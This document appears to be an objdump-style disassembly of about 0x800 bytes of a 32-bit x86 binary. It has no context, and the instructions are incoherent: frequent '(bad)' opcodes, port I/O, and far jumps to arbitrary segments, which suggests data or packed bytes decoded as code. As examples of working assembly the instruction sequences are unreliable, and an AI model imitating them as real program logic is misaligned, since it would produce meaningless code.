  404fb3:	fidivr WORD PTR [ebp+0x5f7fc0c5]
  404fb9:	imul   esp,eax,0xcf64a0fd
  404fbf:	fwait
  404fc0:	sub    ebx,DWORD PTR [ebp+0x4a]
  404fc3:	inc    esi
  404fc4:	jp     0x404f8e
  404fc6:	pop    es
  404fc7:	mov    al,ds:0x8f0b6dc1
  404fcc:	stos   DWORD PTR es:[edi],eax
  404fcd:	in     eax,0x7
  404fcf:	ror    DWORD PTR ds:0x97711d20,cl
  404fd5:	aas    
  404fd6:	mov    al,ds:0xb655f93a
  404fdb:	ret    0x7405
  404fde:	in     eax,dx
  404fdf:	aam    0x37
  404fe1:	push   0x6cb2fb22
  404fe6:	push   esp
  404fe7:	lds    ecx,FWORD PTR [eax]
  404fe9:	push   edx
  404fea:	lahf   
  404feb:	cmp    eax,0xb125e1e6
  404ff0:	pop    edx
  404ff1:	lahf   
  404ff2:	push   ecx
  404ff3:	fmul   QWORD PTR [edi]
  404ff5:	dec    ebp
  404ff6:	cmp    dl,dh
  404ff8:	(bad)  
  404ff9:	jnp    0x404fd5
  404ffb:	pop    ebx
  404ffc:	jmp    0x78de:0x7fc30b4c
  405003:	dec    esi
  405004:	and    DWORD PTR [edi+ebp*4],edi
  405007:	and    cl,BYTE PTR [eax-0x72e84b92]
  40500d:	jo     0x405043
  40500f:	int    0x0
  405011:	xchg   edx,eax
  405012:	ja     0x405015
  405014:	hlt    
  405015:	mov    esp,0x2ad3adf2
  40501a:	sti    
  40501b:	or     BYTE PTR [ebp+0x598aacd2],bh
  405021:	sbb    bl,dh
  405023:	sbb    ch,BYTE PTR [eax+esi*8+0x715a2d9f]
  40502a:	ret    0xae9d
  40502d:	mov    WORD PTR [ecx-0x7db98268],gs
  405033:	shl    ch,1
  405035:	or     edx,DWORD PTR [edx]
  405037:	xchg   edx,eax
  405038:	and    bh,bl
  40503a:	xchg   esi,eax
  40503b:	adc    ah,BYTE PTR [ebp+0x66]
  40503e:	xchg   ebx,eax
  40503f:	cmp    eax,0x7b994e6e
  405044:	enter  0xa889,0xd6
  405048:	and    al,BYTE PTR [edx+0x12]
  40504b:	out    0x2,al
  40504d:	cwde   
  40504e:	sbb    bl,dh
  405050:	ins    DWORD PTR es:[edi],dx
  405051:	dec    edx
  405052:	out    dx,al
  405053:	push   0x78c0d7fc
  405058:	cwde   
  405059:	add    esp,edx
  40505b:	pop    edi
  40505c:	xor    dl,BYTE PTR [esi-0x78]
  40505f:	mov    bl,0x37
  405061:	jl     0x40505e
  405063:	xchg   ebp,eax
  405064:	and    ebp,DWORD PTR [esi-0x4d062647]
  40506a:	jp     0x405015
  40506c:	push   edi
  40506d:	mov    ds:0x2008380a,al
  405072:	and    ebx,esp
  405074:	outs   dx,BYTE PTR ds:[esi]
  405075:	push   0xa394d9e6
  40507a:	mov    eax,ds:0xa102d8fa
  40507f:	adc    BYTE PTR [ebx],dh
  405081:	mov    bl,0x60
  405083:	xor    al,0x6e
  405085:	xor    BYTE PTR [ebx+ebx*1],cl
  405088:	mov    ecx,0xfd23b550
  40508d:	in     al,dx
  40508e:	inc    esp
  40508f:	jo     0x40505a
  405091:	sub    ebx,DWORD PTR [ecx+0x6d]
  405094:	pop    ebp
  405095:	imul   ebp,DWORD PTR [eax],0x17
  405098:	mov    esi,0x99a70a47
  40509e:	scas   eax,DWORD PTR es:[edi]
  40509f:	mov    cl,0x6c
  4050a1:	push   0xe
  4050a3:	mov    edi,0xaed8c6ae
  4050a8:	push   eax
  4050a9:	pop    ds
  4050aa:	sub    dl,BYTE PTR ds:0xcc04edff
  4050b0:	cwde   
  4050b1:	push   ebx
  4050b2:	mov    ch,0x99
  4050b4:	sub    ecx,DWORD PTR [esi+0x1a]
  4050b7:	ins    BYTE PTR es:[edi],dx
  4050b8:	xchg   ebp,eax
  4050b9:	lock int 0xb6
  4050bc:	ins    BYTE PTR es:[edi],dx
  4050bd:	pop    gs
  4050bf:	xor    edi,DWORD PTR cs:[ebx]
  4050c2:	ss mov ebx,0x78fa4be0
  4050c8:	aad    0x8c
  4050ca:	ds pop eax
  4050cc:	adc    BYTE PTR [eax+0x6],al
  4050cf:	jmp    0xdf97667b
  4050d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4050d5:	mov    esp,0x56f12831
  4050da:	sbb    DWORD PTR [edx-0x2e1cd32e],edi
  4050e0:	mov    ecx,0x3786189d
  4050e5:	add    ah,BYTE PTR gs:0x5de30171
  4050ec:	add    DWORD PTR [edi-0x3bf7981b],0x61
  4050f3:	dec    edx
  4050f4:	push   ecx
  4050f5:	stc    
  4050f6:	cld    
  4050f7:	adc    eax,DWORD PTR [eax+edi*1]
  4050fa:	ja     0x405168
  4050fc:	jle    0x4050e4
  4050fe:	push   esp
  4050ff:	(bad)  
  405100:	push   cs
  405101:	arpl   WORD PTR fs:[eax-0x2f],di
  405105:	xchg   edx,eax
  405106:	loope  0x4050bc
  405108:	xor    DWORD PTR [edi+0x5d2d3ff2],edi
  40510e:	and    DWORD PTR [ebx-0x1ef31b28],ecx
  405114:	aaa    
  405115:	inc    edx
  405116:	fild   QWORD PTR [esi-0x44]
  405119:	jge    0x405118
  40511b:	mov    edx,0xe428833e
  405120:	lea    eax,[eax+edi*8]
  405123:	jmp    FWORD PTR [esi+0x71172206]
  405129:	lea    esp,[edi+0x8]
  40512c:	sub    DWORD PTR [edi-0x6e7e3828],edi
  405132:	enter  0x1f35,0x34
  405136:	add    eax,DWORD PTR [esi+0x26]
  405139:	out    dx,eax
  40513a:	cmp    eax,0x6ae98152
  40513f:	pop    ds
  405140:	mov    al,0xed
  405142:	mov    ebp,0x4318ec2c
  405147:	(bad)  
  405148:	(bad)  
  405149:	and    al,0x74
  40514b:	adc    al,0x72
  40514d:	repz xchg ebx,eax
  40514f:	fbstp  TBYTE PTR [ebp-0x1960da02]
  405155:	out    0xca,al
  405157:	xor    eax,0x2f97e282
  40515c:	add    bl,BYTE PTR [ecx+0x6db9c88e]
  405162:	and    ecx,ecx
  405164:	mov    edi,DWORD PTR [bp+0x64a7]
  405169:	mov    bl,0x7c
  40516b:	fmul   QWORD PTR [edx+eiz*8]
  40516e:	stos   DWORD PTR es:[edi],eax
  40516f:	(bad)  
  405170:	les    edx,FWORD PTR [eax+0x547cd379]
  405176:	xor    DWORD PTR ds:0x11ff9a16,ecx
  40517c:	fs popa 
  40517e:	and    edx,DWORD PTR [edx+eax*1]
  405181:	pop    ebx
  405182:	or     edi,0x7936efea
  405188:	push   esp
  405189:	jmp    0x405148
  40518b:	dec    ebx
  40518c:	icebp  
  40518d:	adc    edi,DWORD PTR [edx]
  40518f:	adc    eax,0x41d17c3f
  405194:	jmp    0xfd3f:0x5edb987d
  40519b:	imul   edx,DWORD PTR [ecx],0x76
  40519e:	fwait
  40519f:	es push ebx
  4051a1:	sbb    DWORD PTR [edx],ebp
  4051a3:	sysenter 
  4051a5:	int3   
  4051a6:	cli    
  4051a7:	leave  
  4051a8:	jo     0x40520f
  4051aa:	and    DWORD PTR [esi+0x7c],ebp
  4051ad:	sbb    eax,0xdfa29dc4
  4051b2:	jne    0x4051b3
  4051b4:	ds leave 
  4051b6:	daa    
  4051b7:	lods   al,BYTE PTR ds:[esi]
  4051b8:	xlat   BYTE PTR ds:[ebx]
  4051b9:	int    0xe7
  4051bb:	pop    ecx
  4051bc:	pop    esp
  4051bd:	sbb    esp,DWORD PTR [eax]
  4051bf:	(bad)  
  4051c0:	pushf  
  4051c1:	ss and eax,0x7ade2e68
  4051c7:	xchg   edi,eax
  4051c8:	jnp    0x4051ed
  4051ca:	imul   edx,DWORD PTR [edx+eiz*2+0x56e3dd61],0xb31f5360
  4051d5:	pop    es
  4051d6:	xchg   ebx,eax
  4051d7:	sub    dh,bl
  4051d9:	dec    ebp
  4051da:	jp     0x405206
  4051dc:	and    al,0x78
  4051de:	shr    DWORD PTR ds:0x926d2118,1
  4051e4:	bound  ecx,QWORD PTR [edi]
  4051e6:	leave  
  4051e7:	inc    esp
  4051e8:	sbb    eax,0x5160c77
  4051ed:	loopne 0x4051c4
  4051ef:	push   eax
  4051f0:	dec    esi
  4051f1:	scas   al,BYTE PTR es:[edi]
  4051f2:	push   ds
  4051f3:	push   0xb18d3bf
  4051f8:	call   0x65a5:0xe17837e0
  4051ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405200:	popf   
  405201:	sub    eax,0xf7af9ba
  405206:	jbe    0x40524c
  405208:	stos   DWORD PTR es:[edi],eax
  405209:	(bad)  
  40520b:	xchg   ecx,eax
  40520c:	jb     0x405241
  40520e:	add    al,BYTE PTR [edx]
  405210:	jbe    0x4051a6
  405212:	ret    
  405213:	mov    ebp,0xe1f8ff68
  405218:	or     DWORD PTR [ebx+0x7f],esp
  40521b:	mov    ebx,0x6ebbf1a7
  405220:	jmp    0x4051b9
  405222:	sbb    ch,ch
  405224:	or     DWORD PTR [esi],ecx
  405226:	fwait
  405227:	adc    eax,0xbe880719
  40522c:	cmc    
  40522d:	fidiv  DWORD PTR [ebx]
  40522f:	adc    esp,DWORD PTR [ebp-0x6ec045fe]
  405235:	pop    edi
  405236:	push   eax
  405237:	xchg   edi,eax
  405238:	cmc    
  405239:	sbb    al,0xc8
  40523b:	jle    0x405245
  40523d:	std    
  40523e:	lea    ecx,[ecx-0x18]
  405241:	loopne 0x405221
  405243:	jb     0x405282
  405245:	add    esi,DWORD PTR [edx]
  405247:	out    0xb1,eax
  405249:	jns    0x40525c
  40524b:	jnp    0x40525a
  40524d:	sub    al,0x3d
  40524f:	fistp  QWORD PTR [esi-0xa618a47]
  405255:	fs int 0x54
  405258:	xor    eax,0xaa80b4e9
  40525d:	cmp    edx,DWORD PTR [ebp-0x5c]
  405260:	fs repz pop ebp
  405263:	cmc    
  405264:	clc    
  405265:	fwait
  405266:	xor    ah,BYTE PTR [edx+0x313111ba]
  40526c:	enter  0x1eaf,0x8f
  405270:	inc    esp
  405271:	aaa    
  405272:	xchg   ebx,eax
  405273:	enter  0x255c,0x8
  405277:	bswap  esp
  405279:	dec    eax
  40527a:	sub    eax,0xe0557334
  40527f:	ds cmp esi,esp
  405282:	rcr    BYTE PTR [ebp+ebx*4-0x7a],cl
  405286:	aam    0x69
  405288:	in     al,0x65
  40528a:	mov    BYTE PTR [esi],0x12
  40528d:	out    0xd1,al
  40528f:	sub    eax,0x6f509d4
  405294:	test   eax,0x881d06f5
  405299:	jmp    0x405246
  40529b:	sbb    ch,dh
  40529d:	das    
  40529e:	and    DWORD PTR [ebx-0x7eec3f00],0x69
  4052a5:	xor    BYTE PTR gs:[esi+0x23],bh
  4052a9:	idiv   DWORD PTR [ebx+0x5386b57b]
  4052af:	add    ah,BYTE PTR [esi+0x55]
  4052b2:	ror    DWORD PTR [edi-0x6a],cl
  4052b5:	sub    al,0xfc
  4052b7:	call   0x7d08:0x82edb795
  4052be:	stos   DWORD PTR es:[edi],eax
  4052bf:	out    0xc3,al
  4052c1:	pop    es
  4052c2:	pop    ebp
  4052c3:	xchg   edx,eax
  4052c4:	imul   esp,DWORD PTR [eax+0x1e7f246f],0x17
  4052cb:	adc    BYTE PTR [eax+0x7b05b7ba],bl
  4052d1:	xchg   esi,eax
  4052d2:	movd   mm3,DWORD PTR [ebx+0x19eed321]
  4052d9:	scas   eax,DWORD PTR es:[edi]
  4052da:	cli    
  4052db:	inc    esp
  4052dc:	addr16 push esp
  4052de:	ds mov edi,0x6acdd003
  4052e4:	add    eax,0x512d83a0
  4052e9:	(bad)  
  4052ea:	and    al,0x3d
  4052ec:	jge    0x4052af
  4052ee:	shr    BYTE PTR [edx],1
  4052f0:	push   ss
  4052f1:	sti    
  4052f2:	push   ebx
  4052f3:	and    eax,0x3515b72a
  4052f8:	xlat   BYTE PTR ds:[ebx]
  4052f9:	jae    0x4052b6
  4052fb:	cmp    BYTE PTR [ebx+0x38],dh
  4052fe:	scas   al,BYTE PTR es:[edi]
  4052ff:	dec    ecx
  405300:	and    eax,0xa1efbab
  405305:	push   esp
  405306:	int3   
  405307:	mov    edx,0xa68354aa
  40530c:	mov    bl,0x24
  40530e:	push   edx
  40530f:	xor    BYTE PTR [esp+ebp*4],0x33
  405313:	jecxz  0x405314
  405315:	imul   BYTE PTR [edx+edx*1]
  405318:	psubsw mm5,QWORD PTR [ebx+0xed78428]
  40531f:	jae    0x4052fd
  405321:	jo     0x40538e
  405323:	sbb    ah,BYTE PTR [ebp-0x58]
  405326:	lock jmp 0xc1837fd
  40532c:	lock adc ebp,DWORD PTR [edi+0x5a]
  405330:	add    DWORD PTR [edx],edi
  405332:	jne    0x4052f7
  405334:	inc    ebp
  405335:	cmp    eax,esp
  405337:	add    ebp,DWORD PTR [ebp+0x711dbb6f]
  40533d:	call   0xc86:0x97644390
  405344:	push   eax
  405345:	int3   
  405346:	xor    BYTE PTR [esi+0x77],0x1f
  40534a:	nop
  40534b:	shr    BYTE PTR [edx+ebp*4+0x1b0647c0],cl
  405352:	cdq    
  405353:	bound  esp,QWORD PTR [ebx+0xafcf8a]
  405359:	nop
  40535a:	mov    dl,0x3f
  40535c:	adc    BYTE PTR ds:0x1322aa5c,dh
  405362:	shl    edi,cl
  405364:	inc    eax
  405365:	adc    dl,BYTE PTR [ebx-0x6]
  405368:	fist   WORD PTR [ecx]
  40536a:	pop    ebx
  40536b:	mov    edx,0x52ebf858
  405370:	icebp  
  405371:	not    BYTE PTR [esi*8-0x7c6aaed0]
  405378:	(bad)  
  405379:	cld    
  40537a:	cs sbb eax,0xe8c08c19
  405380:	mov    DWORD PTR [esi],esi
  405382:	mov    ebp,0x6f6a3b7c
  405387:	imul   ebx,eax,0xf92e3f24
  40538d:	aas    
  40538e:	outs   dx,DWORD PTR ds:[esi]
  40538f:	aas    
  405390:	shl    BYTE PTR [esp+eiz*4+0x79],cl
  405394:	dec    ebx
  405395:	ss jle 0x4053f5
  405398:	lds    ebp,FWORD PTR [edi+0x3f]
  40539b:	(bad)  
  40539c:	lods   al,BYTE PTR ds:[esi]
  40539d:	data16 stos BYTE PTR es:[edi],al
  40539f:	cli    
  4053a0:	xor    al,0x1c
  4053a2:	fsubr  DWORD PTR [ebx-0x54]
  4053a5:	pop    ebx
  4053a6:	xor    esi,DWORD PTR cs:[edi-0x51]
  4053aa:	pop    ss
  4053ab:	push   0x18d29261
  4053b0:	dec    edi
  4053b1:	dec    esi
  4053b2:	mov    bh,0xd0
  4053b4:	inc    eax
  4053b5:	loop   0x405399
  4053b7:	cli    
  4053b8:	xchg   DWORD PTR es:[ebp-0x38],esp
  4053bc:	pop    edi
  4053bd:	mov    edx,0xebe3cf0a
  4053c2:	inc    edi
  4053c3:	dec    edi
  4053c4:	push   ss
  4053c5:	pop    ss
  4053c6:	sbb    esi,ebx
  4053c8:	cdq    
  4053c9:	push   esi
  4053ca:	pop    ecx
  4053cb:	nop
  4053cc:	bnd ret 
  4053ce:	add    BYTE PTR [ebp-0x3535c5e2],ah
  4053d4:	aad    0x14
  4053d6:	scas   al,BYTE PTR es:[edi]
  4053d7:	xor    BYTE PTR [edx],dh
  4053d9:	xor    al,0x83
  4053db:	mov    bl,0xdf
  4053dd:	xor    DWORD PTR [ebx+edx*2+0x30997d8d],ecx
  4053e4:	into   
  4053e5:	jmp    0x4053b6
  4053e7:	(bad)  
  4053e8:	jg     0x4053d8
  4053ea:	and    ebx,ebp
  4053ec:	aam    0xca
  4053ee:	mov    eax,ds:0x77dbd328
  4053f3:	or     ah,BYTE PTR [ebp-0x7fd3021]
  4053f9:	lock and al,0xed
  4053fc:	test   BYTE PTR [esi],dl
  4053fe:	je     0x40542b
  405400:	adc    esp,DWORD PTR [edx-0x7a50fdcf]
  405406:	fst    DWORD PTR [esi+0x7d]
  405409:	aaa    
  40540a:	mov    ds:0xd0eaafa2,al
  40540f:	iret   
  405410:	shl    BYTE PTR [eax+eiz*8],0x4a
  405414:	xor    BYTE PTR [ebx+0x33d1da5d],0x48
  40541b:	mov    bl,0xa7
  40541d:	std    
  40541e:	or     BYTE PTR [edi-0x7a],0x4c
  405422:	ss and edi,ebx
  405425:	scas   eax,DWORD PTR es:[edi]
  405426:	adc    al,0xb9
  405428:	push   cs
  405429:	test   dl,dl
  40542b:	adc    cl,ch
  40542d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40542e:	xor    DWORD PTR ds:0x2d08799b,ebx
  405434:	push   esp
  405435:	add    al,0x96
  405437:	and    eax,0x2931aa49
  40543c:	repnz outs dx,BYTE PTR ds:[esi]
  40543e:	push   esp
  40543f:	or     ah,BYTE PTR [esi+esi*2+0x71]
  405443:	out    0xcd,eax
  405445:	cmp    al,0xe2
  405447:	mov    ebx,0x665facad
  40544c:	push   edx
  40544d:	out    0x49,al
  40544f:	adc    ebp,ecx
  405451:	addr16 fdivr st,st(4)
  405454:	fs mov dh,0xf7
  405457:	xor    ebp,DWORD PTR [edi+eax*2+0x27]
  40545b:	mov    ds:0x6264cab3,al
  405460:	sub    BYTE PTR [edi+0x7f],bh
  405463:	cmp    al,0x61
  405465:	mov    eax,ds:0x18b70621
  40546a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40546b:	ficom  WORD PTR [ebx+0x58]
  40546e:	popa   
  40546f:	call   0x933c5c0b
  405474:	adc    DWORD PTR [edi],ecx
  405476:	push   edx
  405477:	add    eax,0xb346d5df
  40547c:	es xor eax,ebx
  40547f:	mov    ds:0x2061a713,al
  405484:	add    ecx,ebp
  405486:	data16 aas 
  405488:	retf   0x292
  40548b:	pop    es
  40548c:	mov    dh,0xbd
  40548e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40548f:	imul   ebx,DWORD PTR [ecx+0x4752f2bd],0x9a3c6e1b
  405499:	jmp    0x405430
  40549b:	adc    eax,0x230a7c3c
  4054a0:	sar    BYTE PTR [esi+0x7365f321],0xaa
  4054a7:	data16 arpl WORD PTR [esi-0x3b],dx
  4054ab:	dec    edi
  4054ac:	dec    ebp
  4054ad:	sar    al,1
  4054af:	jl     0x4054ae
  4054b1:	pop    ds
  4054b2:	cli    
  4054b3:	into   
  4054b4:	(bad)  
  4054b6:	sub    ch,bl
  4054b8:	ret    0x200e
  4054bb:	test   BYTE PTR [eax-0x16c50c02],ch
  4054c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054c2:	sbb    ebp,DWORD PTR [esi+0x44]
  4054c5:	iret   
  4054c6:	mov    DWORD PTR [esi-0xa],edi
  4054c9:	adc    eax,0x568fba45
  4054ce:	mov    ds:0xc5def93d,al
  4054d3:	push   ss
  4054d4:	jecxz  0x40551c
  4054d6:	push   ds
  4054d7:	cmp    cl,BYTE PTR [eax+0x3d77e95]
  4054dd:	xchg   DWORD PTR [edi+0x6c],edx
  4054e0:	inc    esi
  4054e1:	inc    edi
  4054e2:	call   0x9bae46d6
  4054e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4054e8:	repnz xor bl,cl
  4054eb:	mov    gs,WORD PTR [edi+0x70927ec9]
  4054f1:	sub    edi,ebp
  4054f3:	pop    edx
  4054f4:	jge    0x4054f3
  4054f6:	iret   
  4054f7:	out    0x11,eax
  4054f9:	mov    al,ds:0x791598c4
  4054fe:	inc    ebx
  4054ff:	int    0xd5
  405501:	and    al,0x8f
  405503:	push   cs
  405504:	repnz add eax,0x2793d92
  40550a:	add    BYTE PTR [edx-0x11],ch
  40550d:	dec    ebx
  40550e:	xchg   al,ah
  405510:	shl    BYTE PTR [eax+eiz*8],1
  405513:	jnp    0x405542
  405515:	and    eax,0x66dd5b91
  40551a:	shl    DWORD PTR [ebx+0x16],0x62
  40551e:	jge    0x4054ef
  405520:	ss stc 
  405522:	xor    DWORD PTR [edx-0x31a3da8e],edi
  405528:	jl     0x4054e7
  40552a:	leave  
  40552b:	sahf   
  40552c:	mov    al,0xc9
  40552e:	les    eax,FWORD PTR [esi+0x6c]
  405531:	pop    edx
  405532:	js     0x4054c1
  405534:	sbb    al,0xdb
  405536:	ret    0xa001
  405539:	jp     0x4054fb
  40553b:	js     0x405599
  40553d:	cmc    
  40553e:	and    eax,0x20ee2a49
  405543:	sbb    edx,DWORD PTR [esi]
  405545:	pusha  
  405546:	pop    ecx
  405547:	scas   eax,DWORD PTR es:[edi]
  405548:	mov    WORD PTR [esi+0x68],ss
  40554b:	cmp    DWORD PTR [ebp+0x4e],0xc94010ec
  405552:	sahf   
  405553:	inc    edi
  405554:	jno    0x405509
  405556:	add    al,0xc7
  405558:	arpl   WORD PTR [eax-0x660db04c],dx
  40555e:	aaa    
  40555f:	loopne 0x405544
  405561:	add    BYTE PTR [ebx],cl
  405563:	call   DWORD PTR ds:0xa1a43b02
  405569:	xchg   ebp,eax
  40556a:	in     eax,0xed
  40556c:	pop    edi
  40556d:	cmp    ah,BYTE PTR [edx+0x48]
  405570:	pusha  
  405571:	sub    al,0x7f
  405573:	shl    DWORD PTR [esi],1
  405575:	je     0x405590
  405577:	aas    
  405578:	(bad)  
  405579:	mov    esi,DWORD PTR [ebp-0x38]
  40557c:	mov    ecx,DWORD PTR [ebx]
  40557e:	fnstsw WORD PTR [ebp-0x2906270d]
  405584:	(bad)  
  405585:	rcl    BYTE PTR [ebx],cl
  405587:	xor    al,0x8d
  405589:	inc    ebx
  40558a:	arpl   WORD PTR [eax-0x3c],sp
  40558d:	sub    BYTE PTR [ebx],bh
  40558f:	leave  
  405590:	dec    esi
  405591:	popa   
  405592:	inc    ebx
  405593:	jmp    0xcca4:0xfefa1fe1
  40559a:	or     al,BYTE PTR [esi-0x6f8739f0]
  4055a0:	sbb    eax,0x87cafe0b
  4055a5:	jl     0x405595
  4055a7:	jmp    0xfa8ec57d
  4055ac:	push   0xffffffac
  4055ae:	lds    ebp,FWORD PTR [edx-0x1cbec996]
  4055b4:	(bad)  
  4055b5:	inc    eax
  4055b6:	mov    WORD PTR [esi+ebx*4+0x4c1748f8],es
  4055bd:	bound  ecx,QWORD PTR [ebx-0x18]
  4055c0:	jmp    0x405573
  4055c2:	inc    esp
  4055c3:	push   0xffffff9f
  4055c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055c6:	mov    ecx,0x31d4184f
  4055cb:	cmp    ah,BYTE PTR [esi]
  4055cd:	into   
  4055ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055cf:	mov    ds:0x1c420466,al
  4055d4:	mov    dh,0x7
  4055d6:	out    dx,al
  4055d7:	sahf   
  4055d8:	daa    
  4055d9:	jp     0x4055cd
  4055db:	mov    BYTE PTR [ebx+0x7b],al
  4055de:	shld   DWORD PTR [esi],ebp,cl
  4055e1:	in     eax,dx
  4055e2:	sub    esi,DWORD PTR [eax+0x16]
  4055e5:	arpl   WORD PTR [ebp+0x2a],di
  4055e8:	add    DWORD PTR [esi-0x41],0x28
  4055ec:	fnstsw WORD PTR [ebx-0x68cd54d8]
  4055f2:	pop    es
  4055f3:	mov    bl,0xab
  4055f5:	and    edi,ebp
  4055f7:	fstp   QWORD PTR [esi+0x5d1d7670]
  4055fd:	sbb    al,0xa3
  4055ff:	daa    
  405600:	mov    bl,0xa1
  405602:	inc    ebp
  405603:	jl     0x4055a6
  405605:	mov    ds:0xbac3b05b,al
  40560a:	mov    ebp,0x45f71176
  40560f:	leave  
  405610:	add    eax,esi
  405612:	das    
  405613:	or     eax,0x61426d9b
  405618:	push   ebp
  405619:	retf   0xce48
  40561c:	lea    ebx,[edx+0x3e]
  40561f:	(bad)  
  405620:	lock idiv BYTE PTR [eax]
  405623:	and    BYTE PTR [eax],dh
  405625:	add    eax,0xfb06eff2
  40562a:	je     0x405657
  40562c:	sar    DWORD PTR [edi],0x15
  40562f:	addr16 dec ebx
  405631:	dec    ecx
  405632:	pop    eax
  405633:	pusha  
  405634:	xchg   edi,eax
  405635:	out    0x6f,eax
  405637:	sub    DWORD PTR [ebx],0xe3e5d487
  40563d:	ror    DWORD PTR [eax-0x25f1167c],1
  405643:	shr    dh,0x6a
  405646:	push   eax
  405647:	nop
  405648:	dec    ebx
  405649:	fadd   DWORD PTR [edx+0x6c]
  40564c:	js     0x4055f5
  40564e:	test   BYTE PTR [eax-0x21],0xe3
  405652:	adc    eax,0x32b88603
  405657:	jl     0x405674
  405659:	sbb    cl,0x8e
  40565c:	fcom   DWORD PTR [eax-0x4180c9ff]
  405662:	lds    edx,FWORD PTR [ebx+0x2a6109fe]
  405668:	test   al,0x89
  40566a:	mov    esp,0xdd82c30d
  40566f:	jno    0x405610
  405671:	int    0x2b
  405673:	cmp    DWORD PTR [eax-0x7ef6e3b6],eax
  405679:	shl    DWORD PTR [eax+0xb],1
  40567c:	ja     0x40561e
  40567e:	mov    WORD PTR [edx-0x48],fs
  405681:	loop   0x4056d1
  405683:	fidiv  DWORD PTR [edx]
  405685:	jecxz  0x40561d
  405687:	outs   dx,DWORD PTR ds:[esi]
  405688:	test   eax,0x6250b0f1
  40568d:	xchg   edi,eax
  40568e:	cld    
  40568f:	icebp  
  405690:	out    0xb6,al
  405692:	stos   BYTE PTR es:[edi],al
  405693:	xor    cl,BYTE PTR [ebp-0x20759914]
  405699:	inc    edi
  40569a:	(bad)  
  40569b:	mov    edi,0xe975468c
  4056a0:	push   es
  4056a1:	mov    dh,0x67
  4056a3:	sub    esp,DWORD PTR [edx-0x669286b2]
  4056a9:	xchg   edi,eax
  4056aa:	stos   DWORD PTR es:[edi],eax
  4056ab:	dec    edx
  4056ac:	fist   WORD PTR [ebp-0x5e8a49c6]
  4056b2:	nop
  4056b3:	mov    bl,0x3e
  4056b5:	in     al,0x1
  4056b7:	loope  0x4056e7
  4056b9:	xchg   esi,eax
  4056ba:	sub    dh,ah
  4056bc:	and    DWORD PTR [edx-0x8],edx
  4056bf:	dec    esi
  4056c0:	add    al,0x9e
  4056c2:	xor    eax,esi
  4056c4:	sbb    al,0x3b
  4056c6:	dec    eax
  4056c7:	dec    ebp
  4056c8:	pop    ecx
  4056c9:	out    0xf8,al
  4056cb:	fsub   QWORD PTR [eax]
  4056cd:	push   edi
  4056ce:	xchg   DWORD PTR [eax],edi
  4056d0:	mov    eax,0x1ea5759c
  4056d5:	sbb    BYTE PTR [ebx],0x74
  4056d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056d9:	loope  0x405711
  4056db:	shr    ebp,0xa6
  4056de:	mov    bh,0xac
  4056e0:	imul   edi,edi,0xb325e010
  4056e6:	push   eax
  4056e7:	retf   
  4056e8:	js     0x4056c2
  4056ea:	outs   dx,DWORD PTR ds:[esi]
  4056eb:	es mov cl,0xfd
  4056ee:	adc    DWORD PTR [edx+0x30],edx
  4056f1:	push   edi
  4056f2:	sub    ah,BYTE PTR [ebx+0x42b6d6e]
  4056f8:	pop    edx
  4056f9:	and    cl,al
  4056fb:	(bad)  
  4056fc:	xor    BYTE PTR [edx],bl
  4056fe:	pop    ds
  4056ff:	sar    DWORD PTR [ebx],cl
  405701:	xchg   esi,eax
  405702:	(bad)  
  405703:	mov    eax,ds:0xaef08435
  405708:	and    bh,BYTE PTR [ebp+0x37b6b4e6]
  40570e:	rcr    BYTE PTR ds:0x225b7fdb,cl
  405714:	sahf   
  405715:	xchg   esi,eax
  405716:	addr16 fs inc esp
  405719:	jecxz  0x4056aa
  40571b:	(bad)  
  40571c:	mov    esi,0xcb6c991d
  405721:	jmp    0xd9df:0x5ce823a3
  405728:	and    DWORD PTR [ebp-0xa],eax
  40572b:	jb     0x405728
  40572d:	loope  0x4057a4
  40572f:	or     esi,DWORD PTR [esi]
  405731:	mov    DWORD PTR [edx],edx
  405733:	shl    BYTE PTR [edx-0x25],0xb
  405737:	fnstenv [esi-0x45e09575]
  40573d:	sbb    BYTE PTR [ecx+0x59],0xb7
  405741:	mov    ecx,0x6e19b0eb
  405746:	add    al,0x8d
  405748:	add    BYTE PTR [ebx+0x79],dl
  40574b:	ins    BYTE PTR es:[edi],dx
  40574c:	add    DWORD PTR [esi-0x5e4b3000],ecx
  405752:	xchg   DWORD PTR [ebx],esi
  405754:	mov    edi,0x190f1e80
  405759:	xor    eax,0xa537ee5
  40575e:	cld    
  40575f:	lods   eax,DWORD PTR ds:[esi]
  405760:	mov    al,0x10
  405762:	lahf   
  405763:	push   ebx
  405764:	enter  0x5a25,0xde
  405768:	or     eax,0x71e05d21
  40576d:	(bad)  
  40576e:	ins    DWORD PTR es:[edi],dx
  40576f:	dec    ecx
  405770:	jp     0x4057be
  405772:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405773:	cmp    bl,BYTE PTR ds:0xa205db2e
  405779:	push   eax
  40577a:	inc    ecx
  40577b:	int    0x1b
  40577d:	bound  esi,QWORD PTR [edi+0x7371e7dc]
  405783:	cli    
  405784:	jmp    0xf971:0xea822cb2
  40578b:	push   esi
  40578c:	add    eax,esp
  40578e:	inc    ebp
  40578f:	xor    al,BYTE PTR [esi-0x2972c184]
  405795:	add    ch,BYTE PTR [edx-0x6dce691b]
  40579b:	xchg   esp,eax
  40579c:	je     0x4057aa
  40579e:	pop    esi
  40579f:	cs dec ebp
  4057a1:	fs mov ebx,0xf80925f5
  4057a7:	add    dh,BYTE PTR [edi+esi*4+0x58]
  4057ab:	sbb    eax,0xcdb37976
  4057b0:	sub    eax,0xc0d335e9
  4057b5:	ficomp WORD PTR [edx]
  4057b7:	retf   0xfc6c
  4057ba:	loop   0x405826
  4057bc:	push   ebx
  4057bd:	xor    dh,BYTE PTR [ebp*8-0x6d6bef69]
  4057c4:	arpl   WORD PTR [ecx+ebp*1+0x5052ea39],ax
  4057cb:	sbb    BYTE PTR [edx-0x1c],0xaf
  4057cf:	clc    
  4057d0:	mov    ch,0xfc
  4057d2:	mov    ah,0xd2
